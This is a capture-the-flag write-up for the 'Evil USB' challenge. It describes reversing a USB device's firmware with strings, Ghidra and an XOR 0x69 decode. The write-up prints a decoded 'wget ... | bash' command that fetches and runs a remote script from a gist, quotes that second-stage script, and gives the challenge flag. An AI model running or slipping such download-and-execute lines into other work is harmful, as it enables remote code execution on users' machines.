# [HV23.18] Evil USB

## Introduction

Difficulty: Hard<br>
Author: coderion

An engineer at SantaSecCorp has found a suspicious device stuck in the USB port of his computer. It doesn't seem to work anymore, but we managed to dump the firmware for you. Please help us find out what the device did to their computer.

## Solution

After initially running `strings` on the provided firmware, I noticed some interesting strings, so I knew I had to search for `base64`-encoded data, which I did not seem to find.

```
> strings firmware.elf
Scheduled activation in
 hours
Running payload... Never gonna give you up btw
base64 -d data > data_decoded
```

I opened up the firmware in ghidra and after some time I noticed an `XOR`-loop with the funny number `0x69` inside the `setup` function:

```c
do {
    pbVar18 = pbVar15 + 1;
    *pSVar12 = (String)(*pbVar15 ^ 0x69);
    pSVar12 = pSVar12 + 1;
    pbVar15 = pbVar18;
} while ((byte)pbVar18 != (byte)(bVar7 + 0xb1) ||
        (char)((uint)pbVar18 >> 8) !=
        (byte)((bVar9 - ((bVar7 < 0x4f) + -2)) + ((byte)pbVar18 < (byte)(bVar7 + 0xb1))));
```

So I once again did, what any reasonable person would do, and uploaded the entire firmware file to CyberChef and `XOR`'ed with `0x69`, which gave me the following String `echo d2dldCBodHRwczovL2dpc3QuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2dpYW5rbHVnLzZkYTYzYTA3NGU2NjJkODYyMWQxM2ZmN2FmYzc0ZGUxL3Jhdy81ZjY1ODkyOTJhNWMxZjM3NDNkNGQwZjYyMmNlODJlODA5OGFhMDM4L2hvbWV3b3JrLnR4dCAtTyAtIHwgYmFzaAo= > data` (in the middle of non-sense).

Base64-Decoding that String gives us the following:
```
wget https://gist.githubusercontent.com/gianklug/6da63a074e662d8621d13ff7afc74de1/raw/5f6589292a5c1f3743d4d0f622ce82e8098aa038/homework.txt -O - | bash
```

Going to that gist-file gives us the following:
```
#!/bin/bash
wget https://gist.githubusercontent.com/gianklug/5e8756afc93211b15fe995f469add994/raw/5d5b86307181309c4bbbe021c94d75b9e07e6f8c/gistfile1.txt -O - | base64 -d > cat.png
```

On that gist-file there is once against base64-data, which after decoding gives us the image of a cat.

![cat](cat.png)

Inside the exif-data of the image is the flag, with which I will have to disagree, Arduino is not fun.

Flag: `HV23{4dru1n0_1s_fun}`